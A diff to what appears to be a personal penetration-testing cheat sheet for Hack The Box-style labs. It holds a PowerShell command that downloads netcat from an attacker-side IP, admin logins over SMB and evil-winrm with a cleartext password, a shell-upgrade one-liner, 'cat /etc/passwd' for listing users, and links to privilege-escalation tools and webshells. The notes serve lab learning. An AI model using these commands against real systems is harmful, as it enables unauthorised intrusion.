@@ -19,7 +19,8 @@ n : Numeric-only IP address. No hostname resolution. DNS is not being used.
 p : Port. Use to specify a particular port for listening
 netCat for windows:
  "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe" 
-
+ start up a nice shell:
+    python3 -c 'import pty;pty.spawn("/bin/bash")'
  
  smbclient  \\\\10.10.10.131\\ADMIN$ -U Administrator
 
@@ -63,6 +64,8 @@ evil-winrm -i 10.129.136.91 -u administrator -p badminton
 
 windows console history:
 C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+Availabel Users:
+cat /etc/passwd
 
 
 Redis connect:
@@ -120,4 +123,8 @@ Netcat windows:
  https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
 Windows privalage escalation:
 https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
+Web Proxies:
+https://academy.hackthebox.eu/course/preview/using-web-proxies
+
+Parrot OS, it is possible to find webshells under the folder /usr/share/webshells/
 
